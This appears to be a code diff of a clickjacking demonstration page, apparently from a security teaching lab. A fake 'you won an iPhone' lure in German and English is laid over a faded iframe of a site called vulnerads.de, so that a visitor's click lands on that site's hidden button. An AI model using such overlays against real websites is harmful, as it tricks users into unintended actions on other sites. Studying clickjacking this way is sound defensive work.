@@ -1,31 +1,71 @@
 <html>
-    <style>
-        .iframecover {
-            position: absolute;
-            top: 0;
-            left: 60px;
-            width: 500px;
-            height: 350px;
-        }
-        .delete {
-            position: absolute;
-            top: 70px;
-            left: 160px;
-            width: 80px;
-            z-index: -1;
-        }
-        .invisible {
-            opacity: 0.3;
-        }
-    </style>
-<body>
-    <input class="delete" type="button" value="HIER"/>
-    <div class="iframecover">
-        <h1>WOW!</h1>
-        <p>Klicken Sie </p>
-        <p>um den Gewinn einzul&ouml;sen. Denn als 143256. Besucher unserer Seite sind <em>SIE</em> auserw&auml;hlt!</p>
-	<h1><b>Sie haben ein iPhone gewonnen!!!1einself</b></h1>
-    </div>
-    <iframe class="invisible" scrolling="no" width="500px" height="350px" src="https://vulnerads.de/ad/2"></iframe>
-</body>
+    <head>
+        <style>
+            .lang {
+                height: 50px;
+            }
+            .iframecover {
+                position: absolute;
+                top: 37px;
+                left: 60px;
+                width: 500px;
+                height: 350px;
+            }
+            .delete {
+                position: absolute;
+                top: 114px;
+                left: 160px;
+                width: 80px;
+                z-index: -1;
+            }
+            .invisible {
+                opacity: 0.3;
+            }
+        </style>
+        <script>
+            var text = [
+                {
+                    id: "click",
+                    en: "Please click ",
+                    de: "Klicken Sie "
+                }, {
+                    id: "win",
+                    en: "to get your price! As the 143256th visitor of our site <em>YOU</em> are the chosen one!",
+                    de: "um den Gewinn einzul&ouml;sen. Denn als 143256. Besucher unserer Seite sind <em>SIE</em> auserw&auml;hlt!"
+                }, {
+                    id: "iphone",
+                    en: "<b> You get an iPhone for FREE!!!!11oneeleven</b>",
+                    de: "<b>Sie haben ein iPhone gewonnen!!!1einself</b>"
+                }
+            ];
+            
+            function changelanguage(lang) {
+                for(var i=0; i<text.length; i++) {
+                    var cur = text[i];
+                    var element = document.getElementById(cur.id);
+                    if (element) {
+                        element.innerHTML=cur[lang];
+                    } else {
+                        console.log("Element " + cur.id + " could not be found for translation");
+                    }
+                }
+            }
+        </script>
+    </head>
+    <body onLoad="changelanguage('de')">
+        <div class="lang">
+    	    <button onclick="changelanguage('de')">Deutsch</button>
+	        <button onclick="changelanguage('en')">English</button>
+        </div>
+        <div>
+            <input class="delete" type="button" value="HIER"/>
+            <div class="iframecover">
+                <h1>WOW!</h1>
+                <p id="click"></p>
+                <p id="win"></p>
+	        <h1 id="iphone"></h1>
+            </div>
+            <iframe class="invisible" scrolling="no" width="500px" height="350px" src="https://vulnerads.de/ad/2"></iframe>
+        </div>
+    </body>
 </html>
